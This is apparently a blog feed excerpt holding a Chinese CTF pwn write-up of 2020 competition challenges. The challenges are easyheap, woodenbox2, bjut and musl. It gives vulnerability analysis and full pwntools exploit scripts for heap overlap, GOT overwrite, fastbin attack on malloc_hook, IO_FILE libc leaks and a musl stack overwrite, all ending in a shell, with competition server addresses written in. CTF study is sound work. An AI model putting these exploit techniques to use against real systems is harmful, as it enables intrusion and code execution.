9BTev2SVGFg6/xs37TOFbLyr6RRpEHXe78RDg0tJL/tQMeLeR1n5j9T9QKSbfMCV/FMfSiQvw2kJw4bCAD/wP9RrPGV7m/8koQwJW2VGhn3Ju+8lKNZX+nWsyRSH9rXGR5JrN1oOBHXAFS5ho4oEPXVcZHO7AzFKwBlMjTeZZm0dnGj+6CCXXF4Y7613eAeHxmaAHMYzW87W3oklpW1KzuijOAiQD9edEZ/zkwyBZ/Nlx9+u0YAd8bQsaGniA2j2pyPyaFGOalSicSFmDgWmca5x4+wMO3LN8WJlDWbrKFHgYGb0YQIiS9cupg4gqnkOMlTQhf4fQLrFrcA9nx4OL6KlthWmoI82/aFfQTWJK9jZPzJ5ZESsX4akjbZfrPf0QmfmBUqHnPvs8lqjcGrZCrD/Rk3qWchRkFEZJhdBoM7EmUIvCuVHLJodQYmft+/Yv8r2OILm0mhokuA2hXpTca4CfChrGbTEp2t7TA70GB5Lcx6Eku0hJpb9NX1l/HAuebz8n3zpTv9wg5t+o+N7behUkA9oNrwjPgVqst/23BAfKk1bBQkQ4hliq5miSkjbevniVhpD04eTR/wv7TYbZxdrqKhfT+5xeZfByzGT1TcZe6kzBfb8ivCq7BxqVOuuCAuCooDnrBSE175q11tSyfsj+jKcCf/j7o1KaByc4fCBklTcO8I2VD9wPUHzMMVAjgK926g4I1jcMwP6/nE9L8YrdNtkYvudY6qDwjTkoRGMk6kIOnRdroH4+qaWATQdIXWbauS3ViWj85fxWT0bstJqDyUNe91bxypqPFiqLpXIoTj0MACquDvE0oqXK2vgd3snhOIKIZyT5N/OdnthRxl1z3z8vsb2Ni0Ub8Ck65HDcQo8Mq3xj2Xzun+1xr37pUASnUD9l77hKFUPGk4iQJ9JWymkdXAi4cUyGu84oP4ge17cXO+C/ZDdjqrm3tpq+1xrL/EhJnpqfItKjgX8ZUyAdDMACyX/6+YCiCa2Kn58a3hb4lAopY3Vw5Brr4AaQjehFAe1qO/gLuZS/D9bwZFdElYKEXgWmIIlQ4WacZAAuzNJNvTLBnBaweE2PXfTxvx0hvqgAGrixOVeAuGTeF7u/HqI/EgEWbJHF6tQjctVlxEaShapBJmofWBqdvhnRlmGeyjzFl4y48ie1W4fzSn28uW6O0Dcs61ZecwP2pkL51VkzmvzjWkEshbWUwL9QrZYrhn59dDksM/OkddtA== </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>iofile利用</title>
    <link href="https://nocbtm.github.io/2020/04/15/iofile%E5%88%A9%E7%94%A8/"/>
    <id>https://nocbtm.github.io/2020/04/15/iofile利用/</id>
    <published>2020-04-15T06:35:24.000Z</published>
    <updated>2020-04-15T06:35:24.169Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>高校战“疫”网络安全分享赛 pwn 复现</title>
    <link href="https://nocbtm.github.io/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-pwn-%E5%A4%8D%E7%8E%B0/"/>
    <id>https://nocbtm.github.io/2020/03/09/高校战“疫”网络安全分享赛-pwn-复现/</id>
    <published>2020-03-09T06:59:08.000Z</published>
    <updated>2020-03-10T07:09:53.648Z</updated>
    
    <content type="html"><![CDATA[<h2 id="easyheap"><a href="#easyheap" class="headerlink" title="easyheap"></a>easyheap</h2><p>程序没开PIE，got表可写</p><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>ptr[v1]清零了，但*(void **)ptr[v1]没有清零。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">int sub_4009E4()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [rsp+Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  if ( ++dword_6020AC &gt; 4 )</span><br><span class="line">    return puts(&quot;Delete failed.&quot;);</span><br><span class="line">  puts(&quot;What is the index of the item to be deleted?&quot;);</span><br><span class="line">  v1 = sub_400890();</span><br><span class="line">  if ( v1 &lt; 0 || v1 &gt; 6 || !ptr[v1] )</span><br><span class="line">    return puts(&quot;Delete failed.&quot;);</span><br><span class="line">  free(*(void **)ptr[v1]);</span><br><span class="line">  free(ptr[v1]);</span><br><span class="line">  ptr[v1] = 0LL;</span><br><span class="line">  return puts(&quot;Delete successfully.&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>首先申请俩次堆块都是0x10，然后free掉，看到add函数里是先进行malloc(0x10)，然后在做check，然后再申请check(0x400)，所以由于free之后会残留指针，在free掉俩个堆块之后，故意输入大数字让他check size fail直接返回，然后申请一个0x10的堆块就可以实现堆块重叠。通过edit前俩次的堆块来覆盖最后一次malloc的堆块的ptr指针来指向chunk_list的位置，然后伪造chunk结构指向got，并且show一下就可以知道libc了，然后修改free_got为system然后free一个内容为/bin/sh的堆块就可以开启shell。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;sp&apos;, &apos;-h&apos;, &apos;-l&apos;, &apos;110&apos;]</span><br><span class="line">if sys.argv[1]==&quot;l&quot;:</span><br><span class="line">io=process(&apos;./easyheap&apos;)</span><br><span class="line">lib=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">else:</span><br><span class="line">io=remote(&apos;121.36.209.145&apos;,9997)</span><br><span class="line">lib=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">elf=ELF(&apos;./easyheap&apos;)</span><br><span class="line"></span><br><span class="line">def choice(idx):</span><br><span class="line">    io.sendlineafter(&apos;Your choice:\n&apos;, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(size, content):</span><br><span class="line">    choice(1)</span><br><span class="line">    io.sendafter(&apos;this message?\n&apos;, str(size))</span><br><span class="line">    if size&lt; 0x400:</span><br><span class="line">    io.sendafter(&apos;content of the message?\n&apos;, content)</span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">choice(2)</span><br><span class="line">io.sendlineafter(&apos;deleted?\n&apos;,str(idx))</span><br><span class="line"></span><br><span class="line">def edit(idx, content):</span><br><span class="line">    choice(3)</span><br><span class="line">    io.sendlineafter(&apos;modified?\n&apos;,str(idx))</span><br><span class="line">    io.sendafter(&apos;message?\n&apos;, content)</span><br><span class="line"></span><br><span class="line"># ------------------------------------------------</span><br><span class="line">onegadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]</span><br><span class="line">chunk_list=0x6020C0</span><br><span class="line"># ------------------------------------------------</span><br><span class="line">add(0x18,0x18 * &quot;\x10&quot;) #0</span><br><span class="line">add(0x18,0x18 * &quot;\x11&quot;) #1</span><br><span class="line">dele(0)</span><br><span class="line">add(0x500,&apos;&apos;)</span><br><span class="line">dele(1)</span><br><span class="line">add(0x500,&apos;&apos;)</span><br><span class="line"></span><br><span class="line">add(0x18,0x18 * &apos;\x12&apos;) #2</span><br><span class="line">edit(1,p64(0) + p64(0x18) + p64(chunk_list))</span><br><span class="line">edit(2,p64(chunk_list + 8) + p64(chunk_list))</span><br><span class="line">edit(0,p64(chunk_list + 8) + p64(chunk_list) + p64(chunk_list + 0x18) + p64(elf.got[&apos;free&apos;]) + p64(elf.got[&apos;__libc_start_main&apos;]) + p64(chunk_list + 0x30) + p64(elf.got[&apos;free&apos;]) + p64(elf.got[&apos;free&apos;]))</span><br><span class="line"></span><br><span class="line">edit(2,p64(elf.plt[&apos;puts&apos;]))</span><br><span class="line">dele(4)</span><br><span class="line">__libc_start_main = u64(io.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&apos;\x00&apos;))</span><br><span class="line">libc = __libc_start_main - lib.symbols[b&apos;__libc_start_main&apos;]</span><br><span class="line">lib.address = libc</span><br><span class="line">system = lib.symbols[&apos;system&apos;]</span><br><span class="line">binsh = lib.search(&quot;/bin/sh\x00&quot;).next()</span><br><span class="line">__dele_hook = lib.symbols[&apos;__free_hook&apos;]</span><br><span class="line">__malloc_hook = lib.symbols[&apos;__malloc_hook&apos;]</span><br><span class="line">__realloc_hook = lib.symbols[&apos;__realloc_hook&apos;]</span><br><span class="line"></span><br><span class="line">edit(5,p64(system))</span><br><span class="line">edit(0,p64(chunk_list + 8) + p64(binsh))</span><br><span class="line">dele(0)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="woodenbox2"><a href="#woodenbox2" class="headerlink" title="woodenbox2"></a>woodenbox2</h2><p>got表可写，其余保护全开</p><h3 id="漏洞点-1"><a href="#漏洞点-1" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>change_item()函数里面没有对size做限制，堆溢出。</p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>题目难点在于没有输出功能，需要打io_file泄露libc基址。然后fastbin attack 打malloc_hook,这里onegadget失效，用realloc 调整偏移即可。<br>iofile泄露原理可参考EX师傅博客<a href="http://blog.eonew.cn/archives/1190" target="_blank" rel="noopener">http://blog.eonew.cn/archives/1190</a></p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><p>成功率 16分之一<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;sp&apos;, &apos;-h&apos;, &apos;-l&apos;, &apos;110&apos;]</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">    try:</span><br><span class="line">        if sys.argv[1]==&quot;l&quot;:</span><br><span class="line">        io=process(&apos;./woodenbox2&apos;)</span><br><span class="line">        libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">        else:</span><br><span class="line">        io=remote(&apos;121.36.215.224&apos;,9998)</span><br><span class="line">        libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">        elf=ELF(&apos;./woodenbox2&apos;)</span><br><span class="line"></span><br><span class="line">        def choice(idx):</span><br><span class="line">            io.sendlineafter(&apos;Your choice:&apos;, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        def add(size, content):</span><br><span class="line">            choice(1)</span><br><span class="line">            io.sendlineafter(&apos;:&apos;, str(size))</span><br><span class="line">            io.sendafter(&apos;:&apos;, content)</span><br><span class="line"></span><br><span class="line">        def free(idx):</span><br><span class="line">        choice(3)</span><br><span class="line">        io.sendlineafter(&apos;:&apos;,str(idx))</span><br><span class="line"></span><br><span class="line">        def edit(idx,size, content):</span><br><span class="line">            choice(2)</span><br><span class="line">            io.sendlineafter(&apos;:&apos;,str(idx))</span><br><span class="line">            io.sendlineafter(&apos;:&apos;,str(size))</span><br><span class="line">            io.sendafter(&apos;:&apos;, content)</span><br><span class="line"></span><br><span class="line">        # ------------------------------------------------</span><br><span class="line">        iofile_off = [0x25dd,0xf5eb] #_IO_2_1_stderr_+157</span><br><span class="line">        onegadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]</span><br><span class="line"></span><br><span class="line">        # ------------------------------------------------</span><br><span class="line"></span><br><span class="line">        add(0x20,&apos;aaaa&apos;)#0</span><br><span class="line">        add(0x40,&apos;aaaa&apos;)#1</span><br><span class="line">        add(0x60,&apos;aaaa&apos;)#2</span><br><span class="line">        add(0xa0,&apos;aaaa&apos;)#3</span><br><span class="line"></span><br><span class="line">        edit(0,0x40,&apos;a&apos;*0x20+p64(0)+p64(0xc1))</span><br><span class="line">        free(1) #1</span><br><span class="line">        free(1) #2</span><br><span class="line">        add(0x40,&apos;bbbb&apos;) #0</span><br><span class="line">        edit(0,0x60,&apos;a&apos;*0x40+p64(0)+p64(0x71)+p16(iofile_off[0]))</span><br><span class="line">        add(0x60,&apos;aaaa&apos;) # 2</span><br><span class="line">        add(0x60,&apos;aaa&apos;+p64(0)*6+p64(0xfbad1800)+p64(0)*3+&quot;\x00&quot;) #3</span><br><span class="line">        io.recv(0x40)</span><br><span class="line">        leak=u64(io.recv(8))</span><br><span class="line">        info(hex(leak))</span><br><span class="line">        libc.address = leak-(0x7f35bc64a600-0x7f35bc285000)</span><br><span class="line">        log.success(hex(libc.address))</span><br><span class="line">        malloc_hook = libc.sym[&apos;__malloc_hook&apos;]</span><br><span class="line">        free_hook = libc.sym[&apos;__free_hook&apos;]</span><br><span class="line">        one = libc.address+onegadgets[1]</span><br><span class="line">        log.success(hex(malloc_hook))</span><br><span class="line"></span><br><span class="line">        add(0x60,&apos;cccc&apos;)#4</span><br><span class="line">        add(0x60,&apos;dddd&apos;)#5</span><br><span class="line">        free(5)</span><br><span class="line">        edit(0,0x100,0xa0*&apos;\x17&apos;+p64(0)+p64(0x71)+p64(malloc_hook-0x23))</span><br><span class="line">        add(0x60,&apos;bbbb&apos;)</span><br><span class="line">        add(0x60,&apos;d&apos;*0xb+p64(one)+p64(libc.symbols[&quot;realloc&quot;]+13))</span><br><span class="line">        choice(1)</span><br><span class="line">        io.sendlineafter(&apos;:&apos;, str(60))</span><br><span class="line">        io.interactive()</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(e)</span><br><span class="line">io.close()</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure></p><h2 id="bjut"><a href="#bjut" class="headerlink" title="bjut"></a>bjut</h2><p>got表可写，pie没开</p><h3 id="漏洞点-2"><a href="#漏洞点-2" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>show 和 edit功能，可以输入负数，造成数组上溢。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 edit()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [rsp+4h] [rbp-Ch]</span><br><span class="line">  unsigned __int64 v2; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(0x28u);</span><br><span class="line">  puts(&quot;The index of your hw:&quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%d&quot;, &amp;v1);</span><br><span class="line">  if ( v1 &lt;= 15 &amp;&amp; qword_404140[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Input your hw:&quot;);</span><br><span class="line">    read(0, qword_404140[v1], dword_4040E0[v1]);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;out of range!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>通过数组上溢泄露free_got内容，然后修改 free_got为system，然后释放/bin/sh的堆块</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><h2 id="musl"><a href="#musl" class="headerlink" title="musl"></a>musl</h2><p>做这个题的时候当时是蒙的，使用的是musl libc跟平时的glibc有很大差异。其中最大的差异是muls不支持延迟绑定，没有 malloc_hook等<br>具体参考 <a href="https://my.oschina.net/u/2306127/blog/1592004" target="_blank" rel="noopener">https://my.oschina.net/u/2306127/blog/1592004</a></p><h3 id="漏洞点-3"><a href="#漏洞点-3" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>add功能有一次堆溢出的机会</p><h3 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h3><p>溢出修改size然后free造成overlapping<br>free时检查了in_use和下一个chunk的prev_size，提前伪造好prev_size<br>overlapping后再取出来，可以uaf，free chunk的链表头部在libc，uaf之后show泄露libc地址，然后edit把fd和bk改为0x602030，利用双向链表写fd bk的操作把一个堆地址写入0x602040，将heap_store劫持到堆上，实现任意地址读写<br>show和edit的次数有限制，但是可以通过任意地址读写覆盖计数器<br>got plt都不可写，没有hook<br>可以通过任意地址读写改写栈，getshell<br>利用任意地址读，读libc中的environ泄露栈地址，算出栈顶地址，然后利用任意地址写覆盖返回地址</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;sp&apos;, &apos;-h&apos;, &apos;-l&apos;, &apos;110&apos;]</span><br><span class="line">if sys.argv[1]==&quot;l&quot;:</span><br><span class="line">r=process([&apos;./libc.so&apos;,&apos;./carbon&apos;])</span><br><span class="line">libc=ELF(&apos;libc.so&apos;)</span><br><span class="line">else:</span><br><span class="line">r=remote(&apos;119.3.158.103&apos;,19008)</span><br><span class="line">libc=ELF(&apos;libc.so&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(size,data):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;1&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your prefer size? &gt;&apos;)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(&apos;Are you a believer? &gt;&apos;)</span><br><span class="line">    r.sendline(&apos;wdnmd&apos;)</span><br><span class="line">    r.recvuntil(&apos;Say hello to your new sleeve &gt;&apos;)</span><br><span class="line">    r.sendline(data)</span><br><span class="line"></span><br><span class="line">def gg_add(size,data):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;1&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your prefer size? &gt;&apos;)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(&apos;Are you a believer? &gt;&apos;)</span><br><span class="line">    r.sendline(&apos;Y\x00&apos;)</span><br><span class="line">    r.recvuntil(&apos;Say hello to your new sleeve &gt;&apos;)</span><br><span class="line">    r.sendline(data)</span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;2&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your sleeve ID? &gt;&apos;)</span><br><span class="line">    r.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def edit(index,data):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;3&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your sleeve ID? &gt;&apos;)</span><br><span class="line">    r.sendline(str(index))</span><br><span class="line">    sleep(0.5)</span><br><span class="line">    r.sendline(data)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;4&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your sleeve ID? &gt;&apos;)</span><br><span class="line">    r.sendline(str(index))</span><br><span class="line"></span><br><span class="line">heap_store = 0x602030</span><br><span class="line">#add-symbol-file libc.so 0x8000000</span><br><span class="line">#x/64gx 0x82953b0</span><br><span class="line">#x/20gx 0x00007fffff7e0000</span><br><span class="line">add(0x10,&apos;gg&apos;)#0</span><br><span class="line">add(0x30,&apos;gg&apos;)#1</span><br><span class="line">add(0x50,p64(0)*6+p64(0x81)+p64(0xa1))#2</span><br><span class="line">add(0x40,&apos;gg&apos;)#3</span><br><span class="line">add(0x20,&apos;gg&apos;)#4</span><br><span class="line">add(0x20,p64(0x40)+p64(heap_store))#5</span><br><span class="line"></span><br><span class="line">free(0)</span><br><span class="line"></span><br><span class="line">gg_add(0x10,&apos;a&apos;*0x10+p64(0x21)+p64(0x81))#0</span><br><span class="line">free(1)</span><br><span class="line"></span><br><span class="line">add(0x30,&apos;gg&apos;)#1</span><br><span class="line">add(0x30,&apos;gg&apos;)#2 6</span><br><span class="line"></span><br><span class="line">free(2)</span><br><span class="line">show(6)</span><br><span class="line">leak = u64(r.recvuntil(&apos;Done.&apos;,drop=True).ljust(8,&apos;\x00&apos;))</span><br><span class="line">info(hex(leak))</span><br><span class="line">gdb.attach(r)</span><br><span class="line">pause()</span><br><span class="line">libc_base = leak-0x292ad8</span><br><span class="line">log.success(hex(libc_base))</span><br><span class="line">system = libc_base+libc.sym[&apos;system&apos;]</span><br><span class="line">edit(6,p64(heap_store)*2)</span><br><span class="line">free(4)</span><br><span class="line"></span><br><span class="line">add(0x30,p64(heap_store))#pwn</span><br><span class="line">environ = libc_base+0x294FD8</span><br><span class="line">log.success(hex(environ))</span><br><span class="line"></span><br><span class="line">add(0x60,p64(0x71)+p64(environ)+p64(0x71)+p64(libc_base+0x8295570-0x8000000))# environ 9 </span><br><span class="line">edit(5,p64(0))</span><br><span class="line">show(9)</span><br><span class="line">leak = u64(r.recvuntil(&apos;Done.&apos;,drop=True).ljust(8,&apos;\x00&apos;))</span><br><span class="line">stack_rsp = leak-0x118</span><br><span class="line">log.success(hex(stack_rsp))</span><br><span class="line">#gg_stack = 0x7ffffffee638</span><br><span class="line">#print(hex(gg_stack-stack_rsp))</span><br><span class="line">gg_stack = 0xa0+stack_rsp</span><br><span class="line">binsh = libc.search(&apos;/bin/sh\x00&apos;).next()+libc_base</span><br><span class="line">edit(10,p64(0x71)+p64(gg_stack)+&apos;/bin/sh&apos;.ljust(8,&apos;\x00&apos;)+p64(0)+p64(0x41)+p64(binsh))</span><br><span class="line">edit(5,p64(0))</span><br><span class="line">#show(12) test libc_addr</span><br><span class="line">pause()</span><br><span class="line">menu = 0x400c2f</span><br><span class="line">flag = libc_base+0x8295580-0x8000000</span><br><span class="line">pop_rdi_ret = libc_base+0x14862</span><br><span class="line">pop_rsi_ret = libc_base+0x1c237</span><br><span class="line">pop_rdx_ret = libc_base+0x1b92</span><br><span class="line"></span><br><span class="line">puts_addr = libc_base+libc.sym[&apos;puts&apos;]</span><br><span class="line">#edit(10,p64(menu)*10)</span><br><span class="line">edit(10,p64(menu)+p64(pop_rdi_ret)+p64(flag)+p64(system)+p64(menu))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;easyheap&quot;&gt;&lt;a href=&quot;#easyheap&quot; class=&quot;headerlink&quot; title=&quot;easyheap&quot;&gt;&lt;/a&gt;easyheap&lt;/h2&gt;&lt;p&gt;程序没开PIE，got表可写&lt;/p&gt;
